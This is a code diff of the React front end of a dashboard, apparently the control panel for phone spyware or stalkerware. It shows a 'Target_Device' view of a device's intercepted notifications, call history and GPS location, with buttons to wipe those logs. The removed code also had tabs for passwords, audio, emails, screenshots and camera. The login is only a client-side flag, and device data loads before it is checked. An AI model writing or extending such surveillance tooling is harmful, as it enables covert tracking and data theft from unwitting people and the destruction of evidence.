@@ -1,75 +1,40 @@
 import React, { useState, useEffect } from 'react';
+import { ref, onValue, update, remove } from 'firebase/database';
+import { db } from './firebase/firebaseConfig';
 import { Layout } from './components/Layout';
 import { DeviceSidebar } from './components/DeviceSidebar';
 import { DashboardFeed } from './components/DashboardFeed';
-import { useFirebaseLive } from './hooks/useFirebaseLive';
-import { db } from './firebase/firebaseConfig';
-import { ref, onValue, update } from 'firebase/database';
-import { 
-  CheckCircle2, 
-  WifiOff, 
-  Bell, 
-  Globe, 
-  Key, 
-  Camera, 
-  MapPin, 
-  History, 
-  Image as ImageIcon,
-  Search,
-  Phone,
-  Mic,
-  Edit2,
-  Check,
-  X,
-  Mail
-} from 'lucide-react';
-import { SearchBar } from './components/SearchBar';
+import { Login } from './components/Login';
+import { List, Phone, Map, Search, Trash2, Menu } from 'lucide-react';
 import clsx from 'clsx';
 
-import { Login } from './components/Login';
-
 function App() {
+  const [isLoggedIn, setIsLoggedIn] = useState(false);
+  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
   const [devices, setDevices] = useState([]);
   const [selectedDeviceId, setSelectedDeviceId] = useState(null);
-  const [isAuthenticated, setIsAuthenticated] = useState(sessionStorage.getItem('isAuth') === 'true');
+  const [loading, setLoading] = useState(true);
   const [activeTab, setActiveTab] = useState('notifications');
-  const [searchQuery, setSearchQuery] = useState('');
-  const [isEditingName, setIsEditingName] = useState(false);
-  const [tempName, setTempName] = useState('');
+  const [searchTerm, setSearchTerm] = useState('');
 
-  const handleLogin = () => {
-    setIsAuthenticated(true);
-    sessionStorage.setItem('isAuth', 'true');
-  };
+  const tabs = [
+    { id: 'notifications', label: 'Notifications', icon: List, path: 'notifications' },
+    { id: 'calls', label: 'Call History', icon: Phone, path: 'calls' },
+    { id: 'location', label: 'GPS Location', icon: Map, path: 'location' },
+  ];
 
-  const handleLogout = () => {
-    setIsAuthenticated(false);
-    sessionStorage.removeItem('isAuth');
-  };
+  const currentTab = tabs.find(t => t.id === activeTab);
 
-  const handleSaveName = async () => {
-    if (!selectedDeviceId || !tempName.trim()) return;
-    try {
-      const deviceRef = ref(db, `devices/${selectedDeviceId}`);
-      await update(deviceRef, { name: tempName });
-      setIsEditingName(false);
-    } catch (err) {
-      console.error("Failed to update device name", err);
-    }
-  };
-
-  // Fetch all devices for the sidebar
+  // Load devices on mount
   useEffect(() => {
-    if (!isAuthenticated) return;
-    
     const devicesRef = ref(db, 'devices');
-    const unsubscribe = onValue(devicesRef, (snapshot) => {
+    const unsub = onValue(devicesRef, (snapshot) => {
       const data = snapshot.val();
       if (data) {
-        const deviceList = Object.entries(data).map(([id, info]) => ({
+        const deviceList = Object.entries(data).map(([id, val]) => ({
           id,
-          name: info.name || `Device ${id.slice(0, 4)}`,
-          status: info.status || 'offline'
+          ...val,
+          lastPing: val.lastPing || 0
         }));
         setDevices(deviceList);
         if (!selectedDeviceId && deviceList.length > 0) {
@@ -78,151 +43,147 @@ function App() {
       } else {
         setDevices([]);
       }
+      setLoading(false);
     });
-    return () => unsubscribe();
-  }, [selectedDeviceId, isAuthenticated]);
 
-  // Use custom hook to fetch live feed for selected device
-  const { notifications, deviceStatus, error } = useFirebaseLive(selectedDeviceId);
+    return () => unsub();
+  }, [selectedDeviceId]);
 
-  const selectedDevice = devices.find(d => d.id === selectedDeviceId);
+  const handleRenameDevice = async (deviceId, newName) => {
+    try {
+      const deviceRef = ref(db, `devices/${deviceId}`);
+      await update(deviceRef, { name: newName });
+    } catch (err) {
+      console.error("Failed to rename device", err);
+    }
+  };
 
-  if (!isAuthenticated) {
-    return <Login onLogin={handleLogin} />;
+  const handleClearLogs = async (deviceId, path) => {
+    if (!window.confirm(`Are you sure you want to clear all ${path} logs?`)) return;
+    try {
+      const logsRef = ref(db, `logs/${deviceId}/${path}`);
+      await remove(logsRef);
+    } catch (err) {
+      console.error(`Failed to clear ${path} logs`, err);
+    }
+  };
+
+  const handleDeleteLog = async (deviceId, path, logId) => {
+    try {
+      const logRef = ref(db, `logs/${deviceId}/${path}/${logId}`);
+      await remove(logRef);
+    } catch (err) {
+      console.error("Failed to delete log entry", err);
+    }
+  };
+
+  if (loading) {
+    return (
+      <div className="h-screen bg-black flex items-center justify-center">
+        <div className="flex flex-col items-center gap-4">
+          <div className="w-12 h-12 border-4 border-red-600 border-t-transparent rounded-full animate-speed-spin"></div>
+          <span className="text-red-500 font-bold text-xs uppercase tracking-[0.3em] animate-pulse">Initializing_Mirror...</span>
+        </div>
+      </div>
+    );
+  }
+
+  if (!isLoggedIn) {
+    return <Login onLogin={() => setIsLoggedIn(true)} />;
   }
 
   return (
     <Layout
+      isSidebarOpen={isSidebarOpen}
+      setIsSidebarOpen={setIsSidebarOpen}
+      sidebar={
+        <DeviceSidebar
+          devices={devices}
+          selectedDeviceId={selectedDeviceId}
+          onSelectDevice={(id) => {
+            setSelectedDeviceId(id);
+            setIsSidebarOpen(false); // Close on selection
+          }}
+          onLogout={() => setIsLoggedIn(false)}
+          onRenameDevice={handleRenameDevice}
+        />
+      }
       header={
-        <div className="flex items-center w-full justify-between gap-6">
-          {/* 1. Device Info (Left) */}
-          <div className="flex items-center min-w-[240px]">
-            {selectedDevice && (
-              <div className="flex items-center gap-4">
-                <div className={clsx(
-                  "w-10 h-10 rounded-xl flex items-center justify-center transition-all duration-500 border", 
-                  deviceStatus === 'online' ? "bg-emerald-500/10 border-emerald-500/50 text-emerald-500" : "bg-slate-900 border-slate-700 text-slate-500"
-                )}>
-                  {deviceStatus === 'online' ? <CheckCircle2 className="w-5 h-5" /> : <WifiOff className="w-5 h-5" />}
-                </div>
-                <div className="min-w-0">
-                  <div className="flex items-center gap-2">
-                    {isEditingName ? (
-                      <div className="flex items-center gap-1">
-                        <input
-                          type="text"
-                          value={tempName}
-                          onChange={(e) => setTempName(e.target.value)}
-                          className="bg-slate-950 border border-emerald-500/50 text-white text-xs px-2 py-1 rounded outline-none w-32 font-mono"
-                          autoFocus
-                          onKeyDown={(e) => {
-                            if (e.key === 'Enter') handleSaveName();
-                            if (e.key === 'Escape') setIsEditingName(false);
-                          }}
-                        />
-                        <button onClick={handleSaveName} className="p-1 hover:text-emerald-500 transition-colors">
-                          <Check className="w-3.5 h-3.5" />
-                        </button>
-                        <button onClick={() => setIsEditingName(false)} className="p-1 hover:text-red-500 transition-colors">
-                          <X className="w-3.5 h-3.5" />
-                        </button>
-                      </div>
-                    ) : (
-                      <div className="flex items-center gap-2 group">
-                        <h2 className="text-sm font-bold text-white truncate">{selectedDevice.name}</h2>
-                        <button 
-                          onClick={() => {
-                            setTempName(selectedDevice.name);
-                            setIsEditingName(true);
-                          }}
-                          className="p-1 opacity-0 group-hover:opacity-100 transition-opacity hover:text-emerald-500"
-                        >
-                          <Edit2 className="w-3 h-3" />
-                        </button>
-                        {deviceStatus === 'online' && (
-                          <span className="flex h-1.5 w-1.5 rounded-full bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]"></span>
-                        )}
-                      </div>
-                    )}
-                  </div>
-                  <div className="flex items-center gap-2 text-[10px] font-mono uppercase tracking-widest text-slate-500">
-                    <span className={clsx(deviceStatus === 'online' ? "text-emerald-500" : "text-slate-500")}>
-                      {deviceStatus === 'online' ? 'Stream Active' : 'Offline'}
-                    </span>
-                    <span className="opacity-30">/</span>
-                    <span className="truncate">UID: {selectedDeviceId?.slice(0, 8)}</span>
-                  </div>
-                </div>
+        <div className="flex items-center justify-between w-full min-w-max lg:min-w-0 px-2 py-0 gap-4">
+          {/* Brand and Target */}
+          <div className="flex items-center gap-3 lg:gap-6">
+            <button 
+              onClick={() => setIsSidebarOpen(true)}
+              className="lg:hidden p-2 -ml-2 text-red-500 hover:bg-red-950/20"
+            >
+              <Menu className="w-5 h-5" />
+            </button>
+            <div className="flex items-center gap-3 pr-4 lg:pr-6 border-r border-zinc-900">
+              <div className="w-7 h-7 lg:w-8 lg:h-8 bg-red-600 flex items-center justify-center text-white font-black text-base lg:text-lg shadow-lg">N</div>
+              <div className="hidden sm:block">
+                <h1 className="text-[12px] lg:text-sm font-black text-white leading-none tracking-tight font-tech">Notification Manager</h1>
+                <p className="text-[7px] lg:text-[8px] text-zinc-500 font-bold uppercase tracking-[0.2em] mt-1 opacity-90">Live_Stream</p>
               </div>
-            )}
+            </div>
+
+            <div className="bg-zinc-950 border border-zinc-900 flex p-0.5 lg:p-1 shadow-inner">
+              {tabs.map((tab) => (
+                <button
+                  key={tab.id}
+                  onClick={() => setActiveTab(tab.id)}
+                  className={clsx(
+                    "flex items-center gap-1.5 lg:gap-2 px-3 lg:px-5 py-1.5 lg:py-2 text-[9px] lg:text-[10px] font-black uppercase tracking-[0.1em] transition-all whitespace-nowrap",
+                    activeTab === tab.id
+                      ? "bg-red-600 text-white shadow-lg"
+                      : "text-zinc-600 hover:text-zinc-200"
+                  )}
+                >
+                  <tab.icon className="w-3 h-3 lg:w-3.5 lg:h-3.5" />
+                  <span className="hidden xs:inline">{tab.label}</span>
+                  <span className="xs:hidden">{tab.id.charAt(0)}</span>
+                </button>
+              ))}
+            </div>
           </div>
 
-          {/* 2. Tab Controls (Center) */}
-          <div className="flex-1 flex justify-center">
-            {selectedDevice && (
-              <div className="flex items-center gap-1 bg-slate-900/50 p-1 rounded-xl border border-slate-800 backdrop-blur-md">
-                {[
-                  { id: 'notifications', label: 'Signals', icon: Bell },
-                  { id: 'history', label: 'History', icon: History },
-                  { id: 'passwords', label: 'Vault', icon: Key },
-                  { id: 'call_logs', label: 'Calls', icon: Phone },
-                  { id: 'audio', label: 'Audio', icon: Mic },
-                  { id: 'emails', label: 'Emails', icon: Mail },
-                  { id: 'screenshots', label: 'Screens', icon: ImageIcon },
-                  { id: 'location', label: 'GPS', icon: MapPin },
-                  { id: 'camera', label: 'Cam', icon: Camera },
-                ].map((tab) => (
-                  <button
-                    key={tab.id}
-                    onClick={() => setActiveTab(tab.id)}
-                    className={clsx(
-                      "flex items-center gap-2 px-3 py-2 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all duration-300",
-                      activeTab === tab.id 
-                        ? "bg-emerald-500 text-white shadow-[0_0_15px_rgba(16,185,129,0.3)]" 
-                        : "text-slate-500 hover:text-slate-300 hover:bg-white/5"
-                    )}
-                    title={tab.label}
-                  >
-                    <tab.icon className="w-3.5 h-3.5" />
-                    <span className="hidden xl:inline">{tab.label}</span>
-                  </button>
-                ))}
-              </div>
-            )}
-          </div>
+          <div className="flex items-center gap-3 lg:gap-6 flex-1 max-w-sm lg:max-w-xl mx-2 lg:mx-8">
+            <div className="relative flex-1 group">
+              <input
+                type="text"
+                placeholder="Search..."
+                value={searchTerm}
+                onChange={(e) => setSearchTerm(e.target.value)}
+                className="w-full bg-zinc-900 border border-zinc-800 text-white py-1.5 lg:py-2 pl-8 lg:pl-10 pr-3 lg:pr-4 text-[10px] lg:text-xs focus:outline-none focus:border-red-600 transition-all font-mono shadow-inner"
+              />
+              <Search className="w-3.5 h-3.5 lg:w-4 lg:h-4 text-zinc-600 absolute left-2.5 lg:left-3 top-1/2 -translate-y-1/2 group-focus-within:text-red-500" />
+            </div>
 
-          {/* 3. Search Bar (Right) */}
-          <div className="min-w-[300px] flex justify-end">
-            {selectedDevice && (
-              <div className="hidden lg:block w-full">
-                <SearchBar searchQuery={searchQuery} setSearchQuery={setSearchQuery} />
-              </div>
-            )}
+            <button
+              onClick={() => handleClearLogs(selectedDeviceId, currentTab.path)}
+              className="flex items-center gap-1.5 lg:gap-2 px-3 lg:px-4 py-1.5 lg:py-2 border border-red-900/40 text-red-500 hover:bg-red-600 hover:text-white transition-all text-[9px] lg:text-[10px] font-black uppercase tracking-[0.1em] bg-red-950/10 shadow-md whitespace-nowrap"
+            >
+              <Trash2 className="w-3 h-3 lg:w-3.5 lg:h-3.5" />
+              <span className="hidden sm:inline">Clear Logs</span>
+            </button>
+          </div>
+          
+          <div className="flex flex-col items-end min-w-[100px] lg:min-w-[120px]">
+            <span className="text-[7px] lg:text-[8px] font-black text-zinc-700 uppercase tracking-[0.2em] mb-0.5 lg:mb-1">Target_Device</span>
+            <div className="bg-red-950/20 border border-red-900/40 px-2 lg:px-3 py-1 text-[9px] lg:text-[10px] text-red-500 font-black tracking-widest uppercase truncate max-w-[120px] lg:max-w-[150px]">
+              {devices.find(d => d.id === selectedDeviceId)?.name || selectedDeviceId || 'PROBING...'}
+            </div>
           </div>
         </div>
       }
-      sidebar={
-        <DeviceSidebar 
-          devices={devices} 
-          selectedDeviceId={selectedDeviceId} 
-          onSelectDevice={setSelectedDeviceId} 
-          onLogout={handleLogout}
-        />
-      }
     >
       <DashboardFeed 
-        deviceId={selectedDeviceId}
-        deviceName={selectedDevice?.name}
-        deviceStatus={deviceStatus}
-        notifications={notifications}
-        error={error}
+        deviceId={selectedDeviceId} 
         activeTab={activeTab}
-        searchQuery={searchQuery}
-        setActiveTab={setActiveTab}
-        setSearchQuery={setSearchQuery}
+        searchTerm={searchTerm}
+        onDeleteLog={handleDeleteLog}
       />
     </Layout>
   );
-};
+}
 
 export default App;
